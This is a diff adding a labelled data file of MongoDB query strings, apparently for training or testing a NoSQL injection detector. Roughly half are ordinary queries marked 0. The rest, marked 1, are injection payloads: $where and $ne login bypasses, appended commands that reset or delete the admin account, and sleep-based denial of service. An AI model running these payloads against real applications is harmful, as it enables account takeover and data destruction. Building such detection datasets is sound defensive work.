@@ -1,0 +1,40 @@
+"db.createCollection(""mycol"", { capped : true, autoIndexId : true, size :    6142800, max : 10000 } )"::::0
+db.collection.bulkWrite( [{ replaceOne:{"filter" :  { "document" : {username: "user"} ,"replacement" :  { "document" : {username: "user", password: "123456789"}}}] )::::0
+db.test.update({ _id: 1 },{ $addToSet: {letters: [ "c", "d" ] } })::::0
+db.shop.group({"key": {"dealer": true},"initial": {},"reduce": function(obj, prev) {prev.maximumvalueprice = isNaN(prev.maximumvalueprice) ? obj.price :   Math.max(prev.maximumvalueprice, obj.price);}});::::0
+db.restaurants.find().sort( { "borough": 1, "address.zipcode": 1 } )::::0
+$map = new \MongoCode("function () { this.value['p'] = this.value['p'].replace('$from', '$to');emit(this._id, this.value);}"); $collection = $this->mongoCollection(); $reduce = new \MongoCode("function () { }"); $collection_name = $collection->getName(); $collection->db->command([ 'mapreduce' => $collection_name, 'map' => $map, 'reduce' => $reduce, 'out' => ['merge' => $collection_name], 'query' => $query, 'sort' => ['_id' => 1] ]);::::0
+db.collection.find({ },{_id: 0,'name.last': 1,contribs: { $slice: 2 }})::::0
+db.mycol.find({$or:[{"by":"tutorials point"},{"title": "MongoDB Overview"}]}).pretty()::::0
+db.collection.findAndModify({$and[{"for" : "python"},$or: [{"title" : "hex"},$and: [{"by": "tut"}, {"likes" : {$gt:100}}]]]},{sort: { "likes": 1},projection : {"title":1, _id:0}})::::0
+db.students.find({ "grades.mean": { $gt: 70 } },{ "grades.$": 1 })::::0
+db.posts.find( {}, { comments: { $slice: -5 } } )::::0
+try {db.orders.deleteOne({ "_id" : ObjectId("563237a41a4d68582c2509da") },{ w : "majority", wtimeout : 100 });} catch (e) {print (e);}::::0
+db.collection.find( { a: { $bitsAllSet: BinData(0, "MC==") } } )::::0
+db.collection.find({"likes" : {$lte:50}})::::0
+db.inventory.find( { "qty.num": { $all: [ 50 ] } } )::::0
+db.rrecord.renameCollection("record")::::0
+db.inventory.aggregate( [ { $unwind : "$sizes" } ] )::::0
+db.orders.count()::::0
+db.scores.find({ results: { $elemMatch: { $gte: 80, $lt: 85 } } })::::0
+db.inventory.find( { qty: { $mod: [ 4, 0 ] } } )::::0
+db.users.find({username: 'rafid'});db.users.findAndModify({ query: { username:'rafid'}, update:{$set:{'a:a', password: 'dragonball'}},$comment: 'successful MongoDB injection'})::::1
+db.users.find({"username": "admin", $where: "1==1"})//", "password": "abcd"})::::1
+db.users.find({"username": "admin"});db.users.updateOne({username:"admin"},{$set : {password:"12345678"}},{ upsert: true })//", "password": "abcd"})::::1
+db.users.find({username:'dummy'});return{username:tojson(db.getCollectionName()),password:2}}//',password:dummy})::::1
+db.users.find({"username": "admin"});//,"password": {"$gt": ""}})::::1
+Document.find({ "type": { "$ne: 0 "" } })::::1
+db.mycol.find({$or:[{"by":{"$ne": null}},{"title": "MongoDB Overview"}]}).pretty()::::1
+db.users.find({"username": "admin"});db.users.deleteOne({username:"admin"})//", "password": "abcd"})::::1
+db.collection('users').findOne({ "username": "admin", "Password" : {$or: [ {}, "abcd" ] }})::::1
+db.mycol.find({$or:[{"by":{"$ne": null}},{"title": "MongoDB Overview"}]})::::1
+db.users.save({msg:1';var%20d%20=%20new%20Date();%20var%20cd%20=%20null;%20do%20{%20cd%20=%20new%20Date();%20}%20while(cd-d%20<%2010000);var%20foo='bar})::::1
+db.users.find({username:'dummy'});return{username:tojson(db.getName()),password:2}}//,password:'dummy'})::::1
+db.users.find({"username": "admin"; return 1==1;//, "password": {"$ne": ""}})::::1
+db.collection.find({$where: 'orders' > '';return true;var foo='bar'}::::1
+db.logins.find({ username: { $ne: 0 }, password: { $ne: 0 } })::::1
+db.users.find({"username": "admin"});db.users.bulkWrite( [{ updateOne : { "filter" :{"username":"admin"} , "update" : {"username":"newUser", "password":"12345678"}} }])//", "password": "abcd"})::::1
+db.logins.find({ username: { $gte: "" }, password: { $gte: "" } })::::1
+db.users.find({"username": "admin"});db.user.insert(["username"=>"user","password"=>"12345678"])//, "password": {"$ne": ""}})::::1
+db.users.find({"username": "admin"});db.users.bulkWrite( [{ deleteOne : { "filter" :{"username":"admin"} } }])//", "password": "abcd"})::::1
+db.users.find({"username": "admin"});sleep(10000);//", "password": "abcd"})::::1
